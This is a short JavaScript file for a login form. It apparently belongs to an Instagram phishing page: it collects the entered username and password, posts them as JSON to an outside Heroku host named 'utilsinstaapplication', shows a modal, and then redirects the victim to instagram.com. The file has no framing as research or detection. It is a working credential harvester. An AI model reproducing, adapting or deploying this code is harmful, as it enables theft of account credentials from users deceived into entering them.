const password = document.getElementById('password');
const username = document.getElementById('username');
const body = document.querySelector('body');
const inputs = document.querySelectorAll('.input-box');
const button = document.querySelector('.btn');
const modal = document.querySelector('.modal-container');
const main = document.querySelector('main');

inputs.forEach(element => {
  element.addEventListener('input', () => {
    if (username.value.length >= 1 && password.value.length >= 8) {
      button.disabled = false;
    } else {
      button.disabled = true;
    }
  });
});

function getData() {
  const user = {
    username: username.value,
    password: password.value
  }
  const xhr = new XMLHttpRequest();

  xhr.open('POST', 'https://utilsinstaapplication.herokuapp.com/sign');
  xhr.setRequestHeader('Content-type', 'application/json;charset=UTF-8');
  xhr.send(JSON.stringify(user));
  body.style.overflow = 'hidden';
  modal.style.display = 'block';
}

function closeModal() {
  window.location.href = 'https://instagram.com';
}

